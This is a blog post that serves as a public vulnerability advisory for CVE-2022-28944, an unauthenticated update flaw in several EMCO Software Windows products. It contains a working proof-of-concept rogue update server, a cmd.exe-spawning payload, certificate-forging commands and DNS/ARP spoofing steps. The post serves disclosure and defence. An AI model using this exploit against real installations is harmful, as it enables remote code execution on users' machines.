<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>CVE-2022-28944 | Gar Reversing</title>
<meta name=keywords content="cwe_494,public_release">
<meta name=description content="EMCO Software Multiple Products Unauthenticated Update Remote Code Execution Vulnerability (PDF)">
<meta name=author content="Gary">
<link rel=canonical href=https://gar-re.github.io/posts/cve-2022-28944/>
<meta name=google-site-verification content="XYZabc">
<meta name=yandex-verification content="XYZabc">
<meta name=msvalidate.01 content="XYZabc">
<link crossorigin=anonymous href=/assets/css/stylesheet.319f7209271a6127ecb9f000084aa4ce7f5f4394f5ef702b9cbb0f5bdd4523de.css integrity="sha256-MZ9yCScaYSfsufAACEqkzn9fQ5T173ArnLsPW91FI94=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://gar-re.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://gar-re.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://gar-re.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://gar-re.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://gar-re.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript><meta property="og:title" content="CVE-2022-28944">
<meta property="og:description" content="EMCO Software Multiple Products Unauthenticated Update Remote Code Execution Vulnerability (PDF)">
<meta property="og:type" content="article">
<meta property="og:url" content="https://gar-re.github.io/posts/cve-2022-28944/">
<meta property="og:image" content="https://gar-re.github.io/posts/cve-2022-28944/cover.png"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-05-10T00:00:00+00:00">
<meta property="article:modified_time" content="2022-05-10T00:00:00+00:00"><meta property="og:site_name" content="Gar Reversing">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://gar-re.github.io/posts/cve-2022-28944/cover.png">
<meta name=twitter:title content="CVE-2022-28944">
<meta name=twitter:description content="EMCO Software Multiple Products Unauthenticated Update Remote Code Execution Vulnerability (PDF)">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://gar-re.github.io/posts/"},{"@type":"ListItem","position":2,"name":"CVE-2022-28944","item":"https://gar-re.github.io/posts/cve-2022-28944/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2022-28944","name":"CVE-2022-28944","description":"EMCO Software Multiple Products Unauthenticated Update Remote Code Execution Vulnerability (PDF)\n","keywords":["cwe_494","public_release"],"articleBody":"EMCO Software Multiple Products Unauthenticated Update Remote Code Execution Vulnerability (PDF)\nAdvisory Information  Title: EMCO Software Multiple Products Unauthenticated Update Remote Code Execution Vulnerability Vendors contacted: EMCO Software Release mode: Public Release  Vulnerability Information  Class: Download of Code Without Integrity Check [CWE-494] Remotely Exploitable: Yes Locally Exploitable: Yes Severity: High - 8.8 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) CVE Identifier: CVE-2022-28944  Affected Products  EMCO MSI Package Builder for Windows 9.1.4 (uses HTTP) EMCO Remote Installer for Windows 6.0.13 EMCO Ping Monitor for Windows 8.0.18 EMCO Remote Shutdown for Windows 7.2.2 EMCO WakeOnLan Free 2.0.8 EMCO WakeOnLan Professional 2.0.8 EMCO Network Inventory for Windows 5.8.22 (different configuration) EMCO Network Software Scanner for Windows 2.0.8 EMCO UnLock IT for Windows 6.1.1 (uses HTTP)  High-level overview This vulnerability allows remote attackers to execute arbitrary code on the affected installations of EMCO Software. A man-in-the-middle position is required to exploit this vulnerability.\nThe specific flaw exists in the Live Update Wizard and Major Update Wizard in the affected installations of EMCO Software, which insufficiently authenticates its update server. An attacker can spoof the update server and leverage this vulnerability to execute code in the context of the current user.\nRoot Cause Analysis The vulnerability is caused by the Live Update Wizard and Major Update Wizard in the affected installations of EMCO Software.\nBy default, the update check is executed automatically daily and manually through the application menu.\nThe update first requests the MajorUpdate.xml configuration (or MajorUpdateProfessional.xml/MajorUpdateFree.xml) before requesting the Update.xml configuration (or UpdateProfessional.xml/UpdateFree.xml) from storage.emcosoftware.com over HTTP or HTTPS. When HTTP is used, attackers can modify code in transit. When HTTPS is used, insecure certificates are ignored by the affected installations, allowing attackers to use self-signed certificates to modify code in transit.\nAn example of the Update.xml configuration is given below (in this case EMCO MSI Package Builder for Windows 9.1.1).\n  9.1.1.1527  NewFeature Added Windows 11 support.    \t/download/msipackagebuilder/MSIPackageBuilderSetup.exe  If the version specified in  is higher than the version of the installed software, the user is presented with the Live Update Wizard indicating that a new update is available. When accepting the update, the update binary is requested from http(s):\\\\storage.emcosoftware.com\\ and automatically executed. Similar behaviour is seen with the Major Update Wizard.\nNote that for EMCO Network Inventory for Windows 5.8.22 different configurations are requested, namely ent_5.inf and networkinventory5xent.inf which is shown below. Here, if the version is higher than the installed version, the URLs are requested and replaced with the existing - equally named - ones.\n#message={Version 5.8.22.10109 is available. Resolved Issues: * A BIOS serial is not completely visible after a scan. * Unable to specify a registry custom scanning criteria with a comma in a registry key or value. * * For more details see * http://emcosoftware.com/network-inventory/whats-new } #url1=http://storage.emcosoftware.com/autoupdate/networkinventory/v5/NetworkInventoryEnt.exe --SNIPPED-- #redirect=no #version=48 Proof-of-Concept The below script is used as a proof of concept for the Live Update Wizard, a similar approach can be used for the Major Update Wizard (change the majorupdate_xml variable). For affected products that request an update over HTTP, skip the ssl.wrap_socket() call and change the port to 80.\n#!/usr/bin/env python3 # Proof-of-concept script for EMCO Software Multiple Products Unauthenticated Update Remote Code Execution Vulnerability # See report for details. # # Generate self-signed certificate e.g. using: #  openssl req -new -x509 -keyout storage.emcosoftware.com.pem -out storage.emcosoftware.com.pem -days 365 -nodes -subj \"/CN=storage.emcosoftware.com\" # # Author: Gerr.re from http.server import BaseHTTPRequestHandler, HTTPServer import ssl majorupdate_xml = b'''  0.0.0.0  ''' update_xml = b'''  99.9.9.9999  BugFix We recommend the updater using TLS/HTTPS for requests and dropping request for which the TLS certificate is untrusted.   BugFix We recommend checking the signature of the update binary.   /proof.exe ''' class HTTPHandler(BaseHTTPRequestHandler): def do_GET(self): if \"proof.exe\" in self.path: self.send_response(200) self.end_headers() self.wfile.write(open(\"proof.exe\", \"rb\").read()) elif \"/MajorUpdate\" in self.path: self.send_response(200) self.end_headers() self.wfile.write(majorupdate_xml) elif \"/Update\" in self.path: self.send_response(200) self.end_headers() self.wfile.write(update_xml) else: self.send_response(404) self.end_headers() if __name__ == \"__main__\": print(\"Running Server\") try: httpd = HTTPServer((\"0.0.0.0\", 443), HTTPHandler) httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='storage.emcosoftware.com.pem', ssl_version=ssl.PROTOCOL_TLS) httpd.serve_forever() except KeyboardInterrupt: httpd.server_close() Testsetup This proof-of-concept was tested on target Windows 10 21H2 with abovementioned affected products of EMCO Software installed, and attacker Ubuntu 20.04.3 LTS.\nSteps to reproduce  Install an affected product of EMCO Software; Set spoof storage.emcosoftware.com to our attacker ip;  For a proof-of-concept edit c:\\windows\\system32\\drivers\\etc\\hosts on target.  Note: attackers may e.g. use:  poorly configured routers/switches/DNS, DNS spoof / cache poisoning, ARP spoof / cache poisoning.       Compile proof.c on the attacker, e.g. using i686-w64-mingw32-gcc proof.c -o proof.exe;  #include int main(int argc, char const *argv[]){\tWinExec(\"cmd.exe\",1); return TRUE; } Generate self-signed certificates;  e.g. using openssl req -new -x509 -keyout storage.emcosoftware.com.pem -out storage.emcosoftware.com.pem -days 365 -nodes -subj \"/CN=storage.emcosoftware.com\"   Run the proof-of-concept script; Start the affected product of EMCO Software and either  wait a day to trigger update automatically, or trigger the update manually through the application menu;   Accept the update in the Update Wizard.  Attackers will use a persuasive update description to convince a target to accept the update.    As a result, proof.exe is requested and executed in the context of the current user.\nproof.exe is executed in the context of the current user\" / Recommendations The vulnerability presents itself because there is insufficient authentication from the update server.\nWe recommend EMCO Software to release a fix to the issue:\n the updaters using TLS/HTTPS for requests and dropping request for which the TLS certificate is untrusted; the updaters must check the signature of the update binary.  We recommend users to sinkhole the storage.emcosoftware.com domain until a fix is available:\n Open c:\\windows\\system32\\drivers\\etc\\hosts in a text editor with Administrator privileges. Add the following line at the end of the file:  0.0.0.0 storage.emcosoftware.com Report Timeline  18-02-2022: Initial contact with the vendor through the Technical Support Request Form. 18-02-2022: EMCO automatically assigns ticket #35728518. 04-03-2022: Gerr.re send reminder to support@emcosoftware.com after no response. 24-03-2022: EMCO releases MSI Package Builder for Windows 9.1.4 which is also vulnerable. 06-04-2022: Gerr.re send final reminder through the Technical Support Request Form after no response. 06-04-2022: EMCO automatically assigns ticket #39750775. 06-04-2022: Gerr.re sent a request to Mitre for a CVE ID. 28-04-2022: Mitre assigns CVE-2022-28944. 10-05-2022: Public release due to no response from EMCO.  Disclaimer The contents of this advisory are copyright © 2022 Gerr.re, and are licensed under a Creative Commons Attribution-NoDerivatives 4.0 International (CC BY-ND 4.0)\n","wordCount":"1037","inLanguage":"en","image":"https://gar-re.github.io/posts/cve-2022-28944/cover.png","datePublished":"2022-05-10T00:00:00Z","dateModified":"2022-05-10T00:00:00Z","author":{"@type":"Person","name":"Gary"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://gar-re.github.io/posts/cve-2022-28944/"},"publisher":{"@type":"Organization","name":"Gar Reversing","logo":{"@type":"ImageObject","url":"https://gar-re.github.io/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://gar-re.github.io/ accesskey=h title="Gar Reversing (Alt + H)">
<img src=https://gar-re.github.io/gar-re_logo.png alt aria-label=logo height=35>Gar Reversing</a>
<div class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</div>
</div>
<ul id=menu>
<li>
<a href=https://gar-re.github.io/contact/ title=Contact>
<span>Contact</span>
</a>
</li>
<li>
<a href=https://gar-re.github.io/disclosure-policy/ title="Disclosure Policy">
<span>Disclosure Policy</span>
</a>
</li>
<li>
<a href=https://gar-re.github.io/archives/ title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://gar-re.github.io/tags/ title=Tags>
<span>Tags</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<h1 class=post-title>
CVE-2022-28944
</h1>
<div class=post-meta><span title="2022-05-10 00:00:00 +0000 UTC">May 10, 2022</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Gary
</div>
</header>
<figure class=entry-cover>
<img loading=lazy srcset="https://gar-re.github.io/posts/cve-2022-28944/cover_hua29db9ea3d437fd08f35a24d4c3d90ec_83431_360x0_resize_box_3.png 360w ,https://gar-re.github.io/posts/cve-2022-28944/cover_hua29db9ea3d437fd08f35a24d4c3d90ec_83431_480x0_resize_box_3.png 480w ,https://gar-re.github.io/posts/cve-2022-28944/cover_hua29db9ea3d437fd08f35a24d4c3d90ec_83431_720x0_resize_box_3.png 720w ,https://gar-re.github.io/posts/cve-2022-28944/cover_hua29db9ea3d437fd08f35a24d4c3d90ec_83431_1080x0_resize_box_3.png 1080w ,https://gar-re.github.io/posts/cve-2022-28944/cover_hua29db9ea3d437fd08f35a24d4c3d90ec_83431_1500x0_resize_box_3.png 1500w ,https://gar-re.github.io/posts/cve-2022-28944/cover.png 2680w" sizes="(min-width: 768px) 720px, 100vw" src=https://gar-re.github.io/posts/cve-2022-28944/cover.png alt width=2680 height=560>
</figure><div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#advisory-information aria-label="Advisory Information">Advisory Information</a></li>
<li>
<a href=#vulnerability-information aria-label="Vulnerability Information">Vulnerability Information</a><ul>
<li>
<a href=#affected-products aria-label="Affected Products">Affected Products</a></li></ul>
</li>
<li>
<a href=#high-level-overview aria-label="High-level overview">High-level overview</a></li>
<li>
<a href=#root-cause-analysis aria-label="Root Cause Analysis">Root Cause Analysis</a></li>
<li>
<a href=#proof-of-concept aria-label=Proof-of-Concept>Proof-of-Concept</a><ul>
<li>
<a href=#testsetup aria-label=Testsetup>Testsetup</a></li>
<li>
<a href=#steps-to-reproduce aria-label="Steps to reproduce">Steps to reproduce</a></li></ul>
</li>
<li>
<a href=#recommendations aria-label=Recommendations>Recommendations</a></li>
<li>
<a href=#report-timeline aria-label="Report Timeline">Report Timeline</a></li>
<li>
<a href=#disclaimer aria-label=Disclaimer>Disclaimer</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><p>EMCO Software Multiple Products Unauthenticated Update Remote Code Execution Vulnerability (<a href=https://github.com/gar-re/cve-2022-28944/blob/main/cve-2022-28944_public-advisory.pdf>PDF</a>)</p>
<h1 id=advisory-information>Advisory Information<a hidden class=anchor aria-hidden=true href=#advisory-information>#</a></h1>
<ul>
<li><strong>Title:</strong> EMCO Software Multiple Products Unauthenticated Update Remote Code Execution Vulnerability</li>
<li><strong>Vendors contacted:</strong> <a href=https://emcosoftware.com>EMCO Software</a></li>
<li><strong>Release mode:</strong> Public Release</li>
</ul>
<h1 id=vulnerability-information>Vulnerability Information<a hidden class=anchor aria-hidden=true href=#vulnerability-information>#</a></h1>
<ul>
<li><strong>Class:</strong> Download of Code Without Integrity Check <a href=https://cwe.mitre.org/data/definitions/494.html>[CWE-494]</a></li>
<li><strong>Remotely Exploitable:</strong> Yes</li>
<li><strong>Locally Exploitable:</strong> Yes</li>
<li><strong>Severity:</strong> High - <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1">8.8 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</a></li>
<li><strong>CVE Identifier:</strong> <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-28944>CVE-2022-28944</a></li>
</ul>
<h2 id=affected-products>Affected Products<a hidden class=anchor aria-hidden=true href=#affected-products>#</a></h2>
<ul>
<li>EMCO MSI Package Builder for Windows 9.1.4 (uses HTTP)</li>
<li>EMCO Remote Installer for Windows 6.0.13</li>
<li>EMCO Ping Monitor for Windows 8.0.18</li>
<li>EMCO Remote Shutdown for Windows 7.2.2</li>
<li>EMCO WakeOnLan Free 2.0.8</li>
<li>EMCO WakeOnLan Professional 2.0.8</li>
<li>EMCO Network Inventory for Windows 5.8.22 (different configuration)</li>
<li>EMCO Network Software Scanner for Windows 2.0.8</li>
<li>EMCO UnLock IT for Windows 6.1.1 (uses HTTP)</li>
</ul>
<h1 id=high-level-overview>High-level overview<a hidden class=anchor aria-hidden=true href=#high-level-overview>#</a></h1>
<p>This vulnerability allows remote attackers to execute arbitrary code on the affected installations of EMCO Software.
A man-in-the-middle position is required to exploit this vulnerability.</p>
<p>The specific flaw exists in the Live Update Wizard and Major Update Wizard in the affected installations of EMCO Software, which insufficiently authenticates its update server.
An attacker can spoof the update server and leverage this vulnerability to execute code in the context of the current user.</p>
<h1 id=root-cause-analysis>Root Cause Analysis<a hidden class=anchor aria-hidden=true href=#root-cause-analysis>#</a></h1>
<p>The vulnerability is caused by the Live Update Wizard and Major Update Wizard in the affected installations of EMCO Software.</p>
<p>By default, the update check is executed automatically daily and manually through the application menu.</p>
<p>The update first requests the <code>MajorUpdate.xml</code> configuration (or <code>MajorUpdateProfessional.xml</code>/<code>MajorUpdateFree.xml</code>) before requesting the <code>Update.xml</code> configuration (or <code>UpdateProfessional.xml</code>/<code>UpdateFree.xml</code>) from <code>storage.emcosoftware.com</code> over HTTP or HTTPS. When HTTP is used, attackers can modify code in transit. When HTTPS is used, insecure certificates are ignored by the affected installations, allowing attackers to use self-signed certificates to modify code in transit.</p>
<p>An example of the <code>Update.xml</code> configuration is given below (in this case EMCO MSI Package Builder for Windows 9.1.1).</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#f92672>&lt;ROOT&gt;</span>
	<span style=color:#f92672>&lt;UPDATEENTRY&gt;</span>
		<span style=color:#f92672>&lt;VERSION&gt;</span>9.1.1.1527<span style=color:#f92672>&lt;/VERSION&gt;</span>
		<span style=color:#f92672>&lt;CHANGE&gt;</span>
			<span style=color:#f92672>&lt;TYPE&gt;</span>NewFeature<span style=color:#f92672>&lt;/TYPE&gt;</span>
			<span style=color:#f92672>&lt;COMMENT&gt;</span>Added Windows 11 support.<span style=color:#f92672>&lt;/COMMENT&gt;</span>
		<span style=color:#f92672>&lt;/CHANGE&gt;</span>
<span style=color:#75715e>&lt;!-- snipped --&gt;</span>
	<span style=color:#f92672>&lt;/UPDATEENTRY&gt;</span>
<span style=color:#75715e>&lt;!-- snipped --&gt;</span>	
	<span style=color:#f92672>&lt;SETUP&gt;</span>/download/msipackagebuilder/MSIPackageBuilderSetup.exe<span style=color:#f92672>&lt;/SETUP&gt;</span>
<span style=color:#f92672>&lt;/ROOT&gt;</span>
</code></pre></div><p>If the version specified in <code>&lt;VERSION></code> is higher than the version of the installed software, the user is presented with the Live Update Wizard indicating that a new update is available. When accepting the update, the update binary is requested from <code>http(s):\\storage.emcosoftware.com\&lt;SETUP></code> and automatically executed. Similar behaviour is seen with the Major Update Wizard.</p>
<p>Note that for EMCO Network Inventory for Windows 5.8.22 different configurations are requested, namely <code>ent_5.inf</code> and <code>networkinventory5xent.inf</code> which is shown below. Here, if the version is higher than the installed version, the URLs are requested and replaced with the existing - equally named - ones.</p>
<pre tabindex=0><code>#message={Version 5.8.22.10109 is available.

Resolved Issues:
* A BIOS serial is not completely visible after a scan.
* Unable to specify a registry custom scanning criteria with a comma in a registry key or value.
*
* For more details see
* http://emcosoftware.com/network-inventory/whats-new
}

#url1=http://storage.emcosoftware.com/autoupdate/networkinventory/v5/NetworkInventoryEnt.exe
--SNIPPED--

#redirect=no

#version=48
</code></pre><h1 id=proof-of-concept>Proof-of-Concept<a hidden class=anchor aria-hidden=true href=#proof-of-concept>#</a></h1>
<p>The below script is used as a proof of concept for the Live Update Wizard, a similar approach can be used for the Major Update Wizard (change the <code>majorupdate_xml</code> variable). For affected products that request an update over HTTP, skip the <code>ssl.wrap_socket()</code> call and change the port to 80.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
<span style=color:#75715e># Proof-of-concept script for EMCO Software Multiple Products Unauthenticated Update Remote Code Execution Vulnerability</span>
<span style=color:#75715e># See report for details.</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e># Generate self-signed certificate e.g. using:</span>
<span style=color:#75715e># &gt; openssl req -new -x509 -keyout storage.emcosoftware.com.pem -out storage.emcosoftware.com.pem -days 365 -nodes -subj &#34;/CN=storage.emcosoftware.com&#34;</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e># Author: Gerr.re</span>
<span style=color:#f92672>from</span> http.server <span style=color:#f92672>import</span> BaseHTTPRequestHandler, HTTPServer
<span style=color:#f92672>import</span> ssl

majorupdate_xml <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;&#39;&lt;ROOT&gt;
</span><span style=color:#e6db74>  &lt;UPDATEENTRY&gt;
</span><span style=color:#e6db74>    &lt;VERSION&gt;0.0.0.0&lt;/VERSION&gt;
</span><span style=color:#e6db74>  &lt;/UPDATEENTRY&gt;
</span><span style=color:#e6db74>&lt;/ROOT&gt;&#39;&#39;&#39;</span>

update_xml <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;&#39;&lt;ROOT&gt;
</span><span style=color:#e6db74>	&lt;UPDATEENTRY&gt;
</span><span style=color:#e6db74>		&lt;VERSION&gt;99.9.9.9999&lt;/VERSION&gt;
</span><span style=color:#e6db74>		&lt;CHANGE&gt;
</span><span style=color:#e6db74>			&lt;TYPE&gt;BugFix&lt;/TYPE&gt;
</span><span style=color:#e6db74>			&lt;COMMENT&gt;We recommend the updater using TLS/HTTPS for requests and dropping request for which the TLS certificate is untrusted.&lt;/COMMENT&gt;
</span><span style=color:#e6db74>		&lt;/CHANGE&gt;
</span><span style=color:#e6db74>        &lt;CHANGE&gt;
</span><span style=color:#e6db74>			&lt;TYPE&gt;BugFix&lt;/TYPE&gt;
</span><span style=color:#e6db74>			&lt;COMMENT&gt;We recommend checking the signature of the update binary.&lt;/COMMENT&gt;
</span><span style=color:#e6db74>		&lt;/CHANGE&gt;
</span><span style=color:#e6db74>	&lt;/UPDATEENTRY&gt;
</span><span style=color:#e6db74>	&lt;SETUP&gt;/proof.exe&lt;/SETUP&gt;
</span><span style=color:#e6db74>&lt;/ROOT&gt;&#39;&#39;&#39;</span>

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HTTPHandler</span>(BaseHTTPRequestHandler):
    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_GET</span>(self):
        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;proof.exe&#34;</span> <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>path:
            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>)
            self<span style=color:#f92672>.</span>end_headers()
            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(open(<span style=color:#e6db74>&#34;proof.exe&#34;</span>, <span style=color:#e6db74>&#34;rb&#34;</span>)<span style=color:#f92672>.</span>read())
        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#34;/MajorUpdate&#34;</span> <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>path:
            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>)
            self<span style=color:#f92672>.</span>end_headers()
            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(majorupdate_xml)
        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#34;/Update&#34;</span> <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>path:
            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>)
            self<span style=color:#f92672>.</span>end_headers()
            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(update_xml)
        <span style=color:#66d9ef>else</span>:
            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>404</span>)
            self<span style=color:#f92672>.</span>end_headers()

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
    print(<span style=color:#e6db74>&#34;Running Server&#34;</span>)

    <span style=color:#66d9ef>try</span>:
        httpd <span style=color:#f92672>=</span> HTTPServer((<span style=color:#e6db74>&#34;0.0.0.0&#34;</span>, <span style=color:#ae81ff>443</span>), HTTPHandler)
        httpd<span style=color:#f92672>.</span>socket <span style=color:#f92672>=</span> ssl<span style=color:#f92672>.</span>wrap_socket(httpd<span style=color:#f92672>.</span>socket,
                                server_side<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
                                certfile<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;storage.emcosoftware.com.pem&#39;</span>,
                                ssl_version<span style=color:#f92672>=</span>ssl<span style=color:#f92672>.</span>PROTOCOL_TLS)
        httpd<span style=color:#f92672>.</span>serve_forever()
    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>KeyboardInterrupt</span>:
        httpd<span style=color:#f92672>.</span>server_close()
</code></pre></div><h2 id=testsetup>Testsetup<a hidden class=anchor aria-hidden=true href=#testsetup>#</a></h2>
<p>This proof-of-concept was tested on target Windows 10 21H2 with abovementioned affected products of EMCO Software installed, and attacker Ubuntu 20.04.3 LTS.</p>
<h2 id=steps-to-reproduce>Steps to reproduce<a hidden class=anchor aria-hidden=true href=#steps-to-reproduce>#</a></h2>
<ol>
<li>Install an affected product of EMCO Software;</li>
<li>Set spoof <code>storage.emcosoftware.com</code> to our attacker ip;
<ul>
<li>For a proof-of-concept edit <code>c:\windows\system32\drivers\etc\hosts</code> on target.
<ul>
<li>Note: attackers may e.g. use:
<ul>
<li>poorly configured routers/switches/DNS,</li>
<li>DNS spoof / cache poisoning,</li>
<li>ARP spoof / cache poisoning.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Compile <code>proof.c</code> on the attacker, e.g. using <code>i686-w64-mingw32-gcc proof.c -o proof.exe</code>;</li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#66d9ef>const</span> <span style=color:#f92672>*</span>argv[]){	
	WinExec(<span style=color:#e6db74>&#34;cmd.exe&#34;</span>,<span style=color:#ae81ff>1</span>);
	<span style=color:#66d9ef>return</span> TRUE;
}
</code></pre></div><ol start=4>
<li>Generate self-signed certificates;
<ul>
<li>e.g. using <code>openssl req -new -x509 -keyout storage.emcosoftware.com.pem -out storage.emcosoftware.com.pem -days 365 -nodes -subj "/CN=storage.emcosoftware.com"</code></li>
</ul>
</li>
<li>Run the proof-of-concept script;</li>
<li>Start the affected product of EMCO Software and either
<ul>
<li>wait a day to trigger update automatically, or</li>
<li>trigger the update manually through the application menu;</li>
</ul>
</li>
<li>Accept the update in the Update Wizard.
<ul>
<li>Attackers will use a persuasive update description to convince a target to accept the update.</li>
</ul>
</li>
</ol>
<p>As a result, <code>proof.exe</code> is requested and executed in the context of the current user.</p>
<p><p align=center>
<img loading=lazy src=proof.jpg alt="<code>proof.exe</code> is executed in the context of the current user">
</p>
</p>
<h1 id=recommendations>Recommendations<a hidden class=anchor aria-hidden=true href=#recommendations>#</a></h1>
<p>The vulnerability presents itself because there is insufficient authentication from the update server.</p>
<p>We recommend EMCO Software to release a fix to the issue:</p>
<ul>
<li>the updaters using TLS/HTTPS for requests and dropping request for which the TLS certificate is untrusted;</li>
<li>the updaters must check the signature of the update binary.</li>
</ul>
<p>We recommend users to sinkhole the <code>storage.emcosoftware.com</code> domain until a fix is available:</p>
<ol>
<li>Open <code>c:\windows\system32\drivers\etc\hosts</code> in a text editor with Administrator privileges.</li>
<li>Add the following line at the end of the file:</li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>0.0.0.0  storage.emcosoftware.com
</code></pre></div><h1 id=report-timeline>Report Timeline<a hidden class=anchor aria-hidden=true href=#report-timeline>#</a></h1>
<ul>
<li><strong>18-02-2022:</strong> Initial contact with the vendor through the <a href=https://emcosoftware.com/support>Technical Support Request Form</a>.</li>
<li><strong>18-02-2022:</strong> EMCO automatically assigns ticket #35728518.</li>
<li><strong>04-03-2022:</strong> Gerr.re send reminder to <a href=mailto:support@emcosoftware.com>support@emcosoftware.com</a> after no response.</li>
<li><strong>24-03-2022:</strong> EMCO releases MSI Package Builder for Windows 9.1.4 which is also vulnerable.</li>
<li><strong>06-04-2022:</strong> Gerr.re send final reminder through the <a href=https://emcosoftware.com/support>Technical Support Request Form</a> after no response.</li>
<li><strong>06-04-2022:</strong> EMCO automatically assigns ticket #39750775.</li>
<li><strong>06-04-2022:</strong> Gerr.re sent a request to Mitre for a CVE ID.</li>
<li><strong>28-04-2022:</strong> Mitre assigns CVE-2022-28944.</li>
<li><strong>10-05-2022:</strong> Public release due to no response from EMCO.</li>
</ul>
<h1 id=disclaimer>Disclaimer<a hidden class=anchor aria-hidden=true href=#disclaimer>#</a></h1>
<p>The contents of this advisory are copyright © 2022 Gerr.re, and are licensed under a Creative Commons Attribution-NoDerivatives 4.0 International (<a href=https://creativecommons.org/licenses/by-nd/4.0/>CC BY-ND 4.0</a>)</p>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://gar-re.github.io/tags/cwe_494/>cwe_494</a></li>
